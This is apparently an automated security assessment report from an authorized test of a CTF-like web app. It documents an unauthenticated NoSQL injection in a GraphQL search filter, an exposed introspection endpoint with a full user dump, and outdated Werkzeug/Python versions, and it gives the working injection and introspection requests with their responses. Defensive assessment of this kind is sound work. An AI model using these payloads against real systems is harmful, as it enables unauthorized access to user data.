# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — sqli Unauthenticated NoSQL injection in GraphQL `search` filter exposes hidden admin accounts](#finding-1)
    - [2. HIGH — info-disclosure GraphQL introspection and full user list exposed without authentication](#finding-2)
    - [3. MEDIUM — vulnerable-component Outdated Werkzeug 3.0.3 — known CVE-2024-49766 (path traversal) & CVE-2024-49767 (multipart DoS)](#finding-3)
    - [4. MEDIUM — vulnerable-component End-of-life Python 3.8.17 runtime — branch EOL (2024-10-07), no security patches](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqzz4yz8-zqhfst` |
| Target | http://target.local:5100/ |
| Started | 2026-06-30T01:34:45.757Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 5 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:5100`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 2 high, 2 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [sqli] Unauthenticated NoSQL injection in GraphQL `search` filter exposes hidden admin accounts

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5100/

The POST /api/users GraphQL endpoint takes a `search` string argument that the backend deserializes and passes directly as a raw MongoDB query filter (e.g. the default UI sends `{"email": {"$regex": ".*@heytheregotrythis.com"}, "is_admin": false}`). The endpoint is reachable with NO authentication and performs no allow-listing of filter keys or operators, so an attacker fully controls the Mongo query. The front-end is explicitly designed to show only non-admin users (`is_admin: false`), but supplying `{"is_admin": true}` returns the hidden administrator accounts and their email addresses (PII). Because arbitrary Mongo operators ($regex, $ne, $gt, etc.) are accepted, the filter can also be used to enumerate/extract any user record (classic NoSQL injection), making this both an access-control bypass and a data-extraction primitive.

**Reproduction**

```
1. Baseline (negative control, ev-mqzzcord-g): POST /api/users with body {"query":"query { users(search: \"{\\\"email\\\": {\\\"$regex\\\": \\\".*@heytheregotrythis.com\\\"}, \\\"is_admin\\\": false}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email } }"} → returns only user1/user2/user3; no admin record.
2. Injection (positive replays ev-mqzzcozf-h, ev-mqzzcp7m-i): POST /api/users with the search filter changed to {"is_admin": true} → returns admin@heytheregotrythis.com (username admin) and admin2@goodyoutriedsomethingelse.com (username admin2), repeatably.
3. The marker email admin2@goodyoutriedsomethingelse.com appears only in the injected response, never in the baseline, proving the filter is attacker-controlled and the is_admin restriction is bypassable. No session/cookie is required (analyze_session shows no auth material).
```

**Evidence**

- Evidence `ev-mqzzcord-g` — `artifacts/s-0001/ev-mqzzcord-g/`

Request:

```http
POST /api/users HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"query { users(search: \"{\\\"email\\\": {\\\"$regex\\\": \\\".*@heytheregotrythis.com\\\"}, \\\"is_admin\\\": false}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email } }"}
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 275
content-type: application/json
date: Tue, 30 Jun 2026 01:40:45 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "users": [
    {
      "email": "user1@heytheregotrythis.com",
      "username": "user1"
    },
    {
      "email": "user2@heytheregotrythis.com",
      "username": "user2"
    },
    {
      "email": "user3@heytheregotrythis.com",
      "username": "user3"
    }
  ]
}
```

- Evidence `ev-mqzzcozf-h` — `artifacts/s-0001/ev-mqzzcozf-h/`

Request:

```http
POST /api/users HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 50}\") { username email } }"}
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 200
content-type: application/json
date: Tue, 30 Jun 2026 01:40:45 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "users": [
    {
      "email": "admin@heytheregotrythis.com",
      "username": "admin"
    },
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "username": "admin2"
    }
  ]
}
```

- Evidence `ev-mqzzcp7m-i` — `artifacts/s-0001/ev-mqzzcp7m-i/`

Request:

```http
POST /api/users HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 50}\") { username email } }"}
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 200
content-type: application/json
date: Tue, 30 Jun 2026 01:40:46 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{
  "users": [
    {
      "email": "admin@heytheregotrythis.com",
      "username": "admin"
    },
    {
      "email": "admin2@goodyoutriedsomethingelse.com",
      "username": "admin2"
    }
  ]
}
```

<a id="finding-2"></a>

### 2. [HIGH] [info-disclosure] GraphQL introspection and full user list exposed without authentication

- Screen: `s-0004`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5100/

The /graphql endpoint accepts unauthenticated POST requests and discloses two categories of sensitive data:

1. **Schema introspection enabled**: `{__schema{types{name kind}}}` returns the full internal type list including a `UserType` with a `flag` field. `{__type(name:"UserType"){fields{name ...}}}` reveals field names (`username`, `email`, `flag`).

2. **Full user dump without auth**: `{users{username email flag}}` returns all 5 user records with email addresses (e.g. `admin@heytheregotrythis.com`, `admin2@goodyoutriedsomethingelse.com`) and exposes a `flag` field. All query args (`search`, `options`, `isAdmin`, `dummy`) are silently ignored — the endpoint always returns the full user table.

No mutations exist; no authentication is required for any query. The `flag` field is currently null/empty for all users but is part of the exposed schema.

**Reproduction**

```
1. POST http://target.local:5100/graphql with body `{"query":"{__schema{types{name kind}}}"}` (no auth) → full schema returned.
2. POST /graphql with body `{"query":"{users{username email flag}}"}` (no auth) → all 5 users with email addresses returned.
3. Repeat step 2 with any variation of the query — response is always identical (all users, 383 bytes).
```

**Evidence**

- Evidence `ev-mqzzj8qo-1a` — `artifacts/s-0004/ev-mqzzj8qo-1a/`

Request:

```http
GET /graphql HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 400
connection: close
content-length: 53
content-type: application/json
date: Tue, 30 Jun 2026 01:45:51 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{"errors":[{"message":"Must provide query string."}]}
```

- Evidence `ev-mqzzjntv-1f` — `artifacts/s-0004/ev-mqzzjntv-1f/`

Request:

```http
POST /graphql HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json
cookie: <redacted>
authorization: <redacted>

{"query":"{users{username email flag}}"}
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 383
content-type: application/json
date: Tue, 30 Jun 2026 01:46:10 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{"data":{"users":[{"username":"admin","email":"admin@heytheregotrythis.com","flag":null},{"username":"admin2","email":"admin2@goodyoutriedsomethingelse.com","flag":""},{"username":"user1","email":"user1@heytheregotrythis.com","flag":null},{"username":"user2","email":"user2@heytheregotrythis.com","flag":null},{"username":"user3","email":"user3@heytheregotrythis.com","flag":null}]}}
```

- Evidence `ev-mqzzjoo1-1g` — `artifacts/s-0004/ev-mqzzjoo1-1g/`

Request:

```http
POST /graphql HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json
cookie: <redacted>
authorization: <redacted>

{"query":"{users(isAdmin:true){username email flag}}"}
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 383
content-type: application/json
date: Tue, 30 Jun 2026 01:46:11 GMT
server: Werkzeug/3.0.3 Python/3.8.17

{"data":{"users":[{"username":"admin","email":"admin@heytheregotrythis.com","flag":null},{"username":"admin2","email":"admin2@goodyoutriedsomethingelse.com","flag":""},{"username":"user1","email":"user1@heytheregotrythis.com","flag":null},{"username":"user2","email":"user2@heytheregotrythis.com","flag":null},{"username":"user3","email":"user3@heytheregotrythis.com","flag":null}]}}
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] Outdated Werkzeug 3.0.3 — known CVE-2024-49766 (path traversal) & CVE-2024-49767 (multipart DoS)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5100/

The server identifies itself as `Server: Werkzeug/3.0.3 Python/3.8.17` on every response (observed on GET / and GET /static/js/scripts.js). Werkzeug 3.0.3 is older than 3.0.6, which fixes two known advisories:

- CVE-2024-49766 (GHSA-f9vj-2wh5-fj8j) — on Windows with Python < 3.11, `safe_join` / path handling can be bypassed for directory traversal. Python here is 3.8.17 (< 3.11), so the precondition is met IF the host OS is Windows; otherwise not exploitable.
- CVE-2024-49767 (GHSA-q34m-jh98-gwm2) — `multipart/form-data` parsing can consume excessive memory/resources, enabling a denial-of-service.

Both are fixed in Werkzeug 3.0.6. This is a VERSION-BASED finding matched from the Server banner — NOT actively exploited here — so the operator should confirm the exact running version and host OS before relying on it. Worst realistic impact on a likely-Linux host is the DoS (CVE-2024-49767), hence medium.

Additional context tied to this component: a `Server: Werkzeug/...` banner means the app is served by Werkzeug's built-in development server (Flask `app.run()`), which is explicitly documented as not for production use — recommend fronting with a production WSGI server (gunicorn/uWSGI) behind a reverse proxy.

**Reproduction**

```
1. GET http://target.local:5100/ → 200, 844 B; response carries `Server: Werkzeug/3.0.3 Python/3.8.17` (ev-mqzzwtxu-2a).
2. Repeat GET http://target.local:5100/ → 200, 844 B; banner reproduced, version stably reported (ev-mqzzwubq-2b).
3. Negative control: GET http://target.local:5100/verdict-nonexistent-baseline-404 → 404, 207 B (ev-mqzzv9kq-29), distinguishable baseline.
Remediation: upgrade Werkzeug to >= 3.0.6 and do not expose the dev server in production.
```

**Evidence**

- Evidence `ev-mqzzv9kq-29` — `artifacts/_/ev-mqzzv9kq-29/`

Request:

```http
GET /verdict-nonexistent-baseline-404 HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:55:12 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzzwtxu-2a` — `artifacts/_/ev-mqzzwtxu-2a/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 844
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:56:25 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View The Admins</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"> 
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center">User List</h1>
 
        <table class="table table-striped mt-4">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-table"> 
            </tbody>
        </table>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="/static/js/scripts.js"></script>
</body>
</html>
```

- Evidence `ev-mqzzwubq-2b` — `artifacts/_/ev-mqzzwubq-2b/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 844
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:56:25 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View The Admins</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"> 
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center">User List</h1>
 
        <table class="table table-striped mt-4">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-table"> 
            </tbody>
        </table>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="/static/js/scripts.js"></script>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [vulnerable-component] End-of-life Python 3.8.17 runtime — branch EOL (2024-10-07), no security patches

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5100/

The `Server: Werkzeug/3.0.3 Python/3.8.17` banner (observed on GET / and GET /static/js/scripts.js) discloses the interpreter as CPython 3.8.17. Two issues:

- The Python 3.8 series reached END OF LIFE on 2024-10-07 and receives NO further security fixes. Any CPython security bug disclosed after that date (e.g. in the standard library's ssl/email/tarfile/zipfile parsers) will remain unpatched on this branch.
- 3.8.17 (released June 2023) is not even the final 3.8 patch release (3.8.20, Sept 2024), so it is also missing the last batch of 3.8-era security backports.

This is a VERSION-BASED finding from the Server banner — no interpreter-level CVE was actively exploited here. Severity is medium because an EOL runtime is a standing, unpatchable exposure rather than a single fixed flaw. Recommend migrating to a supported Python (>= 3.11/3.12). The banner also needlessly leaks the exact server/interpreter versions; suppressing it reduces fingerprinting.

**Reproduction**

```
1. GET http://target.local:5100/ → 200, 844 B; `Server: Werkzeug/3.0.3 Python/3.8.17` reveals CPython 3.8.17 (ev-mqzzwtxu-2a).
2. Repeat GET http://target.local:5100/ → 200, 844 B; identical banner, version stably reported (ev-mqzzwubq-2b).
3. Negative control: GET .../verdict-nonexistent-baseline-404 → 404, 207 B (ev-mqzzv9kq-29).
Cross-check: Python release calendar — 3.8 EOL 2024-10-07; final 3.8 release was 3.8.20.
Remediation: upgrade to a supported Python branch and suppress the Server header.
```

**Evidence**

- Evidence `ev-mqzzv9kq-29` — `artifacts/_/ev-mqzzv9kq-29/`

Request:

```http
GET /verdict-nonexistent-baseline-404 HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:55:12 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzzwtxu-2a` — `artifacts/_/ev-mqzzwtxu-2a/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 844
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:56:25 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View The Admins</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"> 
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center">User List</h1>
 
        <table class="table table-striped mt-4">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-table"> 
            </tbody>
        </table>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="/static/js/scripts.js"></script>
</body>
</html>
```

- Evidence `ev-mqzzwubq-2b` — `artifacts/_/ev-mqzzwubq-2b/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5100
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 844
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 01:56:25 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View The Admins</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"> 
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center">User List</h1>
 
        <table class="table table-striped mt-4">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-table"> 
            </tbody>
        </table>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="/static/js/scripts.js"></script>
</body>
</html>
```
